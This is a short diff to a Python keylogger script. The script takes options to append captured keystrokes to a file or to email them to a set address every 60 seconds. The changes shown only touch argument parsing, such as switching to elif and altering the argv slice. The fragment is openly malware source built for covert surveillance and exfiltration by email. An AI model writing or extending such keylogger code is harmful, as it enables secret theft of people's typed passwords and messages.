@@ -6,13 +6,12 @@ import smtplib
 
 class Keylogger:
     def __init__(self):
-        self.argument_list = sys.argv[1:]
+        self.argument_list = sys.argv[2:]
         self.options = "hf:e:"
         self.long_options = ["help","output-file=","email="]
 
         self.log = ""
         self.receiver = ""
-        self.fil1 = ""
 
         self.choose_report_method = 0
 
@@ -24,13 +23,13 @@ class Keylogger:
                     print("Usage: python keylogger.py [-h or --help for help] [-f or --output-file file-name, for file to write output to] [-e or --email \"email address\", for email to send outputs to]")
                     exit()
                     
-                if currentArgument in ("-f", "--output-file"):
+                elif currentArgument in ("-f", "--output-file"):
                     print("Writing output to file: %s" % currentValue)
                     self.file1 = open(currentValue, "a")
                     self.choose_report_method = 0
                     self.timer = threading.Timer(60, self.report_file)  
 
-                if currentArgument in ("-e", "--email"):
+                elif currentArgument in ("-e", "--email"):
                     print("Sending emails to (every 60 seconds): " + currentValue)
                     self.receiver = currentValue
                     self.choose_report_method = 1
